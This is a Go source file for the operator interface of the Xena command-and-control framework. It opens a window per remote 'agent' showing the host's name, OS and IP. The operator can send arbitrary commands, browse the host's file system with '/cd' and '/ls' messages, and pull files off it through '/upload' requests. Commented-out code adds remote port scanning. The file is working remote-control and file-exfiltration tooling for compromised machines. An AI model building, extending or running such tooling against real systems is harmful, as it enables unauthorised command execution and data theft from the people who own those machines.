package views

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"runtime"
	"strings"
	"time"
	"ui/core"
	"ui/effects"
	"ui/static"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/google/uuid"
	xenaC2 "github.com/zarkones/xena-client"
	"golang.design/x/clipboard"
)

const AGENT_WINDOW_WIDTH = 960
const AGENT_WINDOW_HEIGHT = 640
const FILES_DIR = "xenalang-scripts"

type ModifiedRichText struct {
	fyne.Container
	Node *widget.RichText
}

func (mv *ModifiedRichText) Tapped(e *fyne.PointEvent) {
	menuItems := make([]*fyne.MenuItem, 1)
	menuItems[0] = fyne.NewMenuItem("Copy", func() {
	})
	m := fyne.NewMenu(
		"MSG_MENU",
		menuItems...,
	)
	widget.ShowPopUpMenuAtPosition(
		m,
		fyne.CurrentApp().Driver().CanvasForObject(mv),
		e.AbsolutePosition,
	)
}

func AgentWindow(agent xenaC2.Agent) {
	w := core.App.NewWindow("XENA: " + agent.Hostname)
	w.Resize(fyne.NewSize(AGENT_WINDOW_WIDTH, AGENT_WINDOW_HEIGHT))
	w.CenterOnScreen()

	w.SetContent(AgentDisplay(agent, &w))

	w.Show()
}

func AgentDisplay(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
	cmdInput := widget.NewEntry()
	cmdInput.SetPlaceHolder("Enter Command Here")

	var messages []xenaC2.Message

	var messagesView *widget.List
	messagesView = widget.NewList(
		func() int {
			return len(messages)
		},

		func() fyne.CanvasObject {
			return widget.NewRichText()
		},

		func(i widget.ListItemID, o fyne.CanvasObject) {
			title := messages[i].Request
			if messages[i].FriendlyTitle != "" {
				title = messages[i].FriendlyTitle
			}
			o.(*widget.RichText).Segments = []widget.RichTextSegment{
				&widget.TextSegment{
					Style: widget.RichTextStyleSubHeading,
					Text:  title,
				},
				&widget.TextSegment{
					Style: widget.RichTextStyleCodeBlock,
					Text:  messages[i].Response,
				},
			}
			messagesView.SetItemHeight(i, o.(*widget.RichText).MinSize().Height)
			o.(*widget.RichText).Refresh()
		},
	)

	messagesView.OnSelected = func(id widget.ListItemID) {
		clipboard.Write(clipboard.FmtText, []byte(messages[id].Response))
	}

	updateMsg := func() {
		messages, _ = xenaC2.FetchMessages(agent.ID)
		messagesView.Refresh()
	}

	agentFileSystemBtn := widget.NewButtonWithIcon("FILE BROWSER", theme.FolderOpenIcon(), func() {
		if agent.ID == "" {
			Alert("exception: Agent ID Empty")
			return
		}

		fileBrowserOpen := true

		w := core.App.NewWindow("XENA: File Browser: " + agent.Hostname)
		w.Resize(fyne.NewSize(AGENT_WINDOW_WIDTH/2, AGENT_WINDOW_HEIGHT/2))
		w.CenterOnScreen()
		w.SetCloseIntercept(func() {
			fileBrowserOpen = false
			w.Close()
		})

		fbCtx := xenaC2.FileBrowserCtx{
			Records: []xenaC2.FileRecord{},
		}

		infoData := binding.NewString()
		infoData.Set("Loading...")
		infoLabel := widget.NewLabelWithData(infoData)

		wdData := binding.NewString()
		wdData.Set("")
		wdLabel := widget.NewLabelWithData(wdData)

		prevDir := ""

		changeDir := func(absolutePath string) error {
			defer updateMsg()

			wdData.Set(absolutePath)

			infoData.Set("Loading...")

			newMsg := xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: "/cd:" + absolutePath,
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
				return err
			}

			newMsg = xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: "/ls",
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
				return err
			}

			return nil
		}

		recordsTable := container.NewVBox()

		go func() {
			newMsg := xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: "/ls",
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
				return
			}

			updateMsg()

			prevLsRespID := ""

			for range time.Tick(time.Second / 2) {
				if !fileBrowserOpen {
					break
				}

				fileBrowserMsg, err := xenaC2.GetMessageByReq(agent.ID, "/ls")
				if err != nil {
					fmt.Println("agent-file-browser: xenaC2.GetMessageByReq failed:", err)
					continue
				}

				if fileBrowserMsg.Response == "" {
					continue
				}

				if fileBrowserMsg.ID == prevLsRespID {
					continue
				}

				if err := json.Unmarshal([]byte(fileBrowserMsg.Response), &fbCtx); err != nil {
					fmt.Println("agent-file-browser: json.Unmarshal failed:", err, "|", fileBrowserMsg.Response)
					continue
				}

				if fbCtx.Err != "" {
					infoData.Set("Error: " + fbCtx.Err)
					continue
				}

				infoDataMsg, _ := infoData.Get()
				if infoDataMsg == "Loading..." {
					infoData.Set("")
				}

				wdData.Set(fbCtx.WorkingDir)

				recordsTable.RemoveAll()

				for _, i := range fbCtx.Records {
					record := i
					icon := theme.FileIcon()
					if record.IsDir {
						icon = theme.FolderIcon()
					}
					row := container.NewHBox(
						widget.NewIcon(icon),
						func() fyne.CanvasObject {
							if record.IsDir {
								return widget.NewButton(record.Name, func() {
									changeDir(record.AbsolutePath)
								})
							}
							return widget.NewLabel(record.Name)
						}(),
						layout.NewSpacer(),
						widget.NewButtonWithIcon("", theme.DownloadIcon(), func() {
							fileRecord, err := xenaC2.RequestFileUpload(agent.ID, record.AbsolutePath)
							if err != nil {
								Warn("Failed to request file upload, exception: " + err.Error())
								return
							}

							jj, _ := json.Marshal(fileRecord)
							fmt.Println(string(jj))

							newMsg := xenaC2.Message{
								ID:      uuid.New().String(),
								AgentID: agent.ID,
								Request: "/upload:" + fileRecord.ID + ";" + record.AbsolutePath,
							}

							if err := xenaC2.InsertMessage(newMsg); err != nil {
								Alert("Failed To Send Message, exception:" + err.Error())
								return
							}

							infoData.Set("Uploading...")
						}),
					)
					recordsTable.Add(row)
				}

				recordsTable.Refresh()

				prevLsRespID = fileBrowserMsg.ID
			}
		}()

		w.SetContent(container.NewBorder(
			container.NewHBox(
				widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
					workingDir, err := wdData.Get()
					if err != nil {
						fmt.Println("agent-file-browser: wdData.Get():", err)
						return
					}

					delim := "/"
					if runtime.GOOS == "windows" {
						delim = "\\"
					}
					if !strings.Contains(workingDir, delim) {
						return
					}
					prevDir = workingDir
					chunks := strings.Split(workingDir, delim)
					newWD := strings.Join(chunks[:len(chunks)-1], delim)
					changeDir(newWD)
				}),
				widget.NewButtonWithIcon("", theme.NavigateNextIcon(), func() {
					if prevDir == "" {
						infoData.Set("Can't Go Forward")
						return
					}
					changeDir(prevDir)
				}),
				infoLabel,
				layout.NewSpacer(),
				wdLabel,
			),
			nil,
			nil,
			nil,
			container.NewVScroll(recordsTable),
		))
		w.Show()
	})

	sendBtn := widget.NewButtonWithIcon("SEND", theme.MailSendIcon(), func() {
		go func() {
			if cmdInput.Text == "" {
				return
			}

			if agent.ID == "" {
				Alert("exception: Agent ID Empty")
				return
			}

			newMsg := xenaC2.Message{
				ID:      uuid.New().String(),
				AgentID: agent.ID,
				Request: cmdInput.Text,
			}

			if err := xenaC2.InsertMessage(newMsg); err != nil {
				Alert("Failed To Send Message, exception:" + err.Error())
			} else {
				updateMsg()
				cmdInput.SetText("")
			}
		}()
	})

	go func() {
		updateMsg()
		for range time.Tick(time.Second * 4) {
			updateMsg()
		}
	}()

	// inspector := ToolsInspector()
	// toolsTable := NewToolsTable(agent, &inspector)

	img, _ := png.Decode(bytes.NewReader(static.XenaAvatar))
	avatar := canvas.NewImageFromImage(img)
	avatar.FillMode = canvas.ImageFillOriginal

	return container.NewBorder(
		// Top.
		effects.Gradient(
			container.NewHBox(
				avatar,
				widget.NewLabel("Hostname: "+agent.Hostname),
				widget.NewLabel("OS: "+agent.OS+" "+agent.Arch),
				widget.NewLabel("IP: "+agent.IpAddress),
			),
			true,
			true,
		),

		// Bottom.
		nil,

		// Left.
		nil,

		// Right.
		nil,

		// Primary.
		// container.NewVSplit(
		// 	container.NewHSplit(
		// 		effects.Gradient(toolsTable, true, false),
		// 		effects.Gradient(container.NewVScroll(&inspector), true, true),
		// 	),

		container.NewBorder(
			// Top.
			nil,

			// Bottom.
			cmdInput,

			// Left.
			nil,

			// Right.
			effects.Gradient(
				container.NewVBox(layout.NewSpacer(), agentFileSystemBtn, sendBtn),
				false,
				true,
			),

			// Primary.
			effects.Gradient(
				messagesView,
				false,
				true,
			),
			// ),
		),
	)
}

// func AgentDisplayInUnified(agent xenaC2.Agent, w *fyne.Window) fyne.CanvasObject {
// 	cmdInput := widget.NewEntry()
// 	cmdInput.SetPlaceHolder("Enter Command Here")

// 	msgTextWidget := container.NewVBox()

// 	updateMsg := func() {
// 		msgText := ""

// 		msgs, err := xenaC2.FetchMessages(agent.ID)
// 		if err != nil {
// 			Alert("failed to read messages from the database:" + err.Error())
// 			return
// 		}

// 		if len(msgs) == 0 {
// 			return
// 		}

// 		doubleBufferedCont := container.NewVBox()

// 		// msgTextWidget.RemoveAll()

// 		for _, msg := range msgs {
// 			if msg.FriendlyTitle != "" {
// 				msgText += "[ " + msg.FriendlyTitle + " ]:\n"
// 			} else {
// 				msgText += "[ " + msg.Request + " ]:\n"
// 			}
// 			msgText += msg.Response
// 			msgText += "\n\n"
// 			doubleBufferedCont.Add(
// 				container.NewHBox(
// 					widget.NewLabel(msgText),
// 					widget.NewSeparator(),
// 					widget.NewButton("COPY", func() {
// 						func(asCmd string) {
// 							clipboard.Write(clipboard.FmtText, []byte(asCmd))
// 						}(msg.Request)
// 					}),
// 				),
// 			)
// 			msgText = ""
// 		}

// 		// msgTextWidget.SetText(msgText)

// 		msgTextWidget = doubleBufferedCont
// 	}

// 	go updateMsg()

// 	portScanBtn := widget.NewButton("Port Scan", func() {
// 		AgentPortScan(func(host string, port int) {
// 			newMsg := xenaC2.Message{
// 				ID:            uuid.New().String(),
// 				AgentID:       agent.ID,
// 				FriendlyTitle: "Port scan of " + net.JoinHostPort(host, fmt.Sprint(port)),
// 			}

// 			payload := payload.PortScanCtx{
// 				Type: payload.TYPE_PORT_SCAN,
// 				Host: host,
// 				Port: port,
// 			}

// 			jsonPayload, err := json.Marshal(&payload)
// 			if err != nil {
// 				Alert("Failed To Serialize Message, exception:" + err.Error())
// 				return
// 			}

// 			newMsg.Request = string(jsonPayload)

// 			if err := xenaC2.InsertMessage(newMsg); err != nil {
// 				Alert("Failed To Send Message, exception:" + err.Error())
// 				return
// 			}

// 			go updateMsg()
// 		})
// 	})

// 	aboutBtn := widget.NewButton("About", func() {
// 		newMsg := xenaC2.Message{
// 			ID:      uuid.New().String(),
// 			AgentID: agent.ID,
// 			Request: "/about",
// 		}
// 		if err := xenaC2.InsertMessage(newMsg); err != nil {
// 			Alert("Failed To Send Message, exception:" + err.Error())
// 			return
// 		}
// 		go updateMsg()
// 	})

// 	sendBtn := widget.NewButton("SEND", func() {
// 		if cmdInput.Text == "" {
// 			return
// 		}

// 		if agent.ID == "" {
// 			Alert("exception: Agent ID Empty")
// 			return
// 		}

// 		newMsg := xenaC2.Message{
// 			ID:      uuid.New().String(),
// 			AgentID: agent.ID,
// 			Request: cmdInput.Text,
// 		}

// 		if err := xenaC2.InsertMessage(newMsg); err != nil {
// 			Alert("Failed To Send Message, exception:" + err.Error())
// 		} else {
// 			go updateMsg()
// 			cmdInput.SetText("")
// 		}
// 	})

// 	runPipelineBtn := widget.NewButton("Run Pipeline", func() {
// 		if agent.ID == "" {
// 			Alert("exception: Agent ID Empty")
// 			return
// 		}

// 		selectPipeW := core.App.NewWindow("Select Pipeline")
// 		selectPipeW.Resize(fyne.NewSize(100, 100))
// 		selectPipeW.SetContent(container.NewVBox())
// 		selectPipeW.Show()
// 	})

// 	go func() {
// 		for range time.Tick(time.Second * 2) {
// 			go updateMsg()
// 		}
// 	}()

// 	return container.NewBorder(
// 		// Top.
// 		effects.Gradient(
// 			container.NewHBox(
// 				widget.NewLabel("Hostname: "+agent.Hostname),
// 				widget.NewLabel("OS: "+agent.OS+" "+agent.Arch),
// 			),
// 			true,
// 			true,
// 		),

// 		// Bottom.
// 		nil,

// 		// Left.
// 		nil,

// 		// Right.
// 		nil,

// 		// Primary.
// 		container.NewBorder(
// 			// Top.
// 			nil,

// 			// Bottom.
// 			container.NewBorder(nil, nil, nil, sendBtn, cmdInput),

// 			// Left.
// 			nil,

// 			// Right.
// 			container.NewVBox(
// 				portScanBtn,
// 				aboutBtn,
// 				runPipelineBtn,
// 				// runScriptBtn,
// 			),

// 			// Primary.
// 			container.NewScroll(msgTextWidget),
// 		),
// 	)
// }
